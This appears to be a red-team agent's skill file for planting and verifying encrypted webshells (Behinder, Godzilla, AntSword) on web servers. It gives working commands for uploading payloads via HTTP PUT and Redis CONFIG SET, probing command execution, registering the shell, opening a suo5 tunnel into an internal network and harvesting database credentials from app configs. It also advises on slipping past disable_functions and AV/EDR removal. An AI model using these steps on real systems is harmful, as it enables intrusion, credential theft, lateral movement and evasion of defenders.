# WebShell Toolkit: Behinder, Godzilla, and AntSword Delivery

Produces an encrypted shell that the operator can open in a real client, then proves it works by running commands through it. The deliverable is not the file on disk — it is the `webshell` row (`url`, `shell_type`, `pass_key`, `privilege`) plus the probe transcript that shows a command executed. Payload sources, generated stubs, and probe output land under `RESULT_DIR`; the shell is also the entry point for the tunnel that follows.

`RESULT_DIR` is the engagement result directory (`runs/` under the engagement root unless the operator points it elsewhere).

## When to use

- You have a write primitive into a web-reachable directory: a file upload form, `PUT` enabled, a database `INTO OUTFILE`, a Redis `CONFIG SET dir` + `SAVE`, log poisoning plus `include`, or a template/plugin editor.
- The target runs PHP, JSP/JSPX, ASPX, or ColdFusion and a client-side shell is expected downstream — the operator must be able to connect to it from their own machine.
- You need a stable command channel that survives your own request timeouts, before establishing a tunnel.
- Not for: raw command execution through a single request (`?cmd=id`) as the final state. That is a test, not a deliverable, and it is usually flagged and removed.
- Not for: persistence. No cron job, no `authorized_keys`, no scheduled task, no service install. The shell file is the artifact; the tunnel is the access.

## Prerequisites

Every step below has a fallback and nothing in this list is mandatory — if a tool is missing, use the fallback named beside it.

- Client trees `toolkit/Behinder`, `toolkit/Godzilla`, `toolkit/AntSword` — these are not fetched by `bash $DSH_HOME/redteam/setup.sh --yes` and are not inside the toolkit tarball. Download each from its own distribution page and place it in the matching directory. Fallback: a pre-generated payload from another machine, plus `curl` for verification.
- Java for the GUI clients — `java -version`; install with `apt install openjdk-17-jre` if absent. Fallback: no Java means no GUI, and the `sed` key rewrite in step 3 generates a working Behinder payload without it.
- A graphical session for the clients — `DISPLAY=:10.0` over the operator's X bridge. Fallback: generate the payload with `sed`, hand the URL and key to the operator, and verify with `curl`.
- `curl` for every verification step — fallback `wget --post-data`, or the shell's own HTTP client through the tunnel.
- A writable web path discovered during exploitation — fallback: enumerate the document root from an error page, `phpinfo`, or a leaked config before choosing a filename.

## Workflow

1. Identify the runtime and the served directory. Every later choice depends on this, so record the evidence.

```
curl -s -i http://TARGET/ | head -20
curl -s http://TARGET/index.php -o /dev/null -w '%{http_code} %{content_type}\n'
```

2. Pick the family by runtime and by what the operator's client supports.

- PHP → Behinder PHP payload, or Godzilla `PHP_XOR_BASE64` if the target has no AES extension available.
- JSP/JSPX → Behinder JSP (Tomcat 7-10, WebLogic, Spring Boot embedded).
- ASPX → Behinder ASPX or Godzilla `CSharp_AES_BASE64`.
- AntSword speaks plain `eval($_POST[...])` payloads and is the fallback when both encryption profiles fail on an unusual build.

3. Generate the payload offline. Behinder payloads carry the key inline, so the key can be rewritten without the GUI.

```
cp "$DSH_HOME/redteam/toolkit/Behinder/server/shell.php" RESULT_DIR/beh-TARGET.php
sed -i 's/e45e329feb5d925b/YourKey2026/g' RESULT_DIR/beh-TARGET.php

```

Godzilla is generated from its GUI because the payload, the key, and the crypto profile must match on both sides:

```
DISPLAY=:10.0 java -jar "$DSH_HOME/redteam/toolkit/Godzilla/Godzilla.jar"
# shell type = PHP, payload = base64, encoder = base64, key = YourKey2026
# save the generated file to RESULT_DIR/god-TARGET.php, run the local test it offers
```

4. Upload through whatever primitive you already proved. Do not invent a new one for this step.

```
curl -s -X PUT --data-binary @RESULT_DIR/beh-TARGET.php http://TARGET/uploads/beh-TARGET.php -o /dev/null -w '%{http_code}\n'

redis-cli -h TARGET_IP CONFIG SET dir /var/www/html
redis-cli -h TARGET_IP CONFIG SET dbfilename beh-TARGET.php
redis-cli -h TARGET_IP --pipe < RESULT_DIR/beh-TARGET.php
redis-cli -h TARGET_IP SAVE

```

5. Verify the payload executes before opening any client. Fetching the file must not return source code.

```
curl -s http://TARGET/uploads/beh-TARGET.php -o RESULT_DIR/ws-fetch.txt \
  -w 'code=%{http_code} size=%{size_download}\n'
grep -c 'e45e329feb5d925b' RESULT_DIR/ws-fetch.txt   # 0 means the source is not exposed
```

6. Prove command execution with a request that a client would send, and keep the response.

```
curl -s -X POST http://TARGET/uploads/beh-TARGET.php \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'pass=YourKey2026' -o RESULT_DIR/ws-probe-TARGET.bin \
  -w 'code=%{http_code} size=%{size_download}\n'
base64 -d RESULT_DIR/ws-probe-TARGET.bin 2>/dev/null | head -20
```

7. Run the standard probe through the client (Behinder: right-click the shell → Virtual Terminal; Godzilla: Command Execution module) and save the transcript.

```
id; uname -a; hostname; pwd; ls -la /
# Windows targets
whoami /priv & hostname & ipconfig /all
```

8. Register the shell as soon as it answers, before doing anything else with it.

```
redteam_webshell_add url='http://TARGET/uploads/beh-TARGET.php' shell_type=behinder \
  pass_key='YourKey2026' privilege=www-data secret_ref=RESULT_DIR/ws-probe-TARGET.bin \
  asset_id=1 note='uploaded via PUT into /uploads, verified POST probe'

redteam_webshell_update id=1 status=active privilege=www-data \
  check_note='command output: uid=33(www-data) gid=33(www-data), hostname web01'
```

`shell_type` accepts `behinder`, `godzilla`, `antSword`, `antsword`, or `custom` — use the canonical spelling of the family that actually opened the session.

9. Use the shell as a tunnel entry. The tunnel belongs to the `suo5-tunnel` skill; this skill only supplies a verified entry.

```
redteam_tunnel_add kind=suo5 listen=127.0.0.1:1080 entry='http://TARGET/uploads/beh-TARGET.php' \
  reach='10.20.0.0/16' entry_kind=target-http webshell_id=1 \
  command='suo5 -t http://TARGET/uploads/beh-TARGET.php -l 127.0.0.1:1080'
```

10. Escalate or stop. The probe output decides the privilege tier: a `www-data`/`apache` shell is a normal-privilege result, a `root`/`SYSTEM` shell is an administrative one. Read the application config from the shell for database credentials — that is usually the shortest path to the next scored result.

```
```

11. Cleanup. Keep or remove the file, but say which. If removing, do it through the same shell so the write is undone cleanly.

```
rm -f /var/www/html/uploads/beh-TARGET.php
# or, when the operator wants the shell kept, record the exact path in the note
```

## Output and evidence

Files under `RESULT_DIR`:

- `beh-<host>.php`, `beh-<host>.jsp`, `god-<host>.php` — the generated payloads, so the operator can regenerate the same session.
- `ws-fetch.txt` — proof the file is parsed rather than served as source.
- `ws-probe-<host>.bin` and the decoded `ws-probe-<host>.txt` — the request/response pair that shows a command executed.
- `ws-shell-output-<host>.txt` — the probe transcript (`id`, `uname -a`, `hostname`, config grep).

Database rows:

- `webshell` via `redteam_webshell_add`: `url`, `shell_type`, `pass_key`, `privilege`, `secret_ref`, `asset_id`, `note`.
- Shell status via `redteam_webshell_update`: `status`, `privilege`, `check_note` after each re-verification.
- `tunnel` via `redteam_tunnel_add` with `entry_kind=target-http`.
- Score hit via `redteam_score_hit` code `server-host`: `points=10` for a normal service account, `points=50` for a root/SYSTEM shell. A shell that only lists a directory without executing commands scores nothing.
- Chain step via `redteam_chain_add` with `stage=exploit`, `tool` carrying the upload command, `result` carrying the probe output summary.
- Screenshot via `redteam_shot_add` for the client UI or terminal output when the operator wants the visual proof.

What counts as evidence: a decoded response containing the output of a command you chose, plus the request that produced it (`curl` line, or the client's request log). The presence of a file at a URL is not evidence — encrypted shells return a body even when the key is wrong.

## Failure modes

- `GET` on the shell returns the PHP source verbatim → the file sits outside the executed path, or the extension is not mapped. Move it under the real document root and keep a mapped extension.
- Upload returns `200` but `GET` returns `404` → a rewrite rule, a different vhost root, or the write path is not served. Confirm the document root before uploading again.
- Behinder reports a key error or drops the connection immediately → pass key and payload key disagree, or the upload altered the file (CRLF translation). Re-fetch the file, compare `md5sum` with the local copy.
- Godzilla connects but every operation returns an empty body → the crypto profile differs (AES vs XOR base64) or the payload's `eval` path is blocked on PHP 8. Regenerate with the profile the runtime actually supports.
- Commands return empty output while `phpinfo`-style reads work → `disable_functions` blocks `system`, `exec`, `shell_exec`, `passthru`, `proc_open`, `popen`. Use a file-manager module, read config files with `file_get_contents`, and look for a non-blocked call path.
- `open_basedir restriction in effect` → you are confined to the web root. Write and read inside it; use the application itself to reach outside.
- The file disappears minutes after upload → AV/EDR or a sync job removed it. Rename, change content padding, re-upload through the same primitive.
- `shell_type` rejected on record → the value must be `behinder`, `godzilla`, `antSword`, `antsword`, or `custom`. The display names are not accepted.

## Notes

- Name the three families exactly as written here — Behinder, Godzilla, AntSword. Their local nicknames are not used in this fork.
- Opsec: neutral filenames (`cache-<random>.php`), avoid `shell`/`cmd`/`upload` stems, keep the file size close to a normal asset, and never leave more than one copy per host.
- Idempotency: the same `url` plus `pass_key` is one row. Re-running the upload should call `redteam_webshell_update`, not `redteam_webshell_add`, or the score ledger double-counts the host.
- The pass key is stored in the database, never in the report text. Reference the payload with `secret_ref` and keep the file under `RESULT_DIR`.
- The shell is the highest-value artifact of the whole chain — the tunnel, the internal scan, and the lateral movement all start from this row, so register it before you explore.
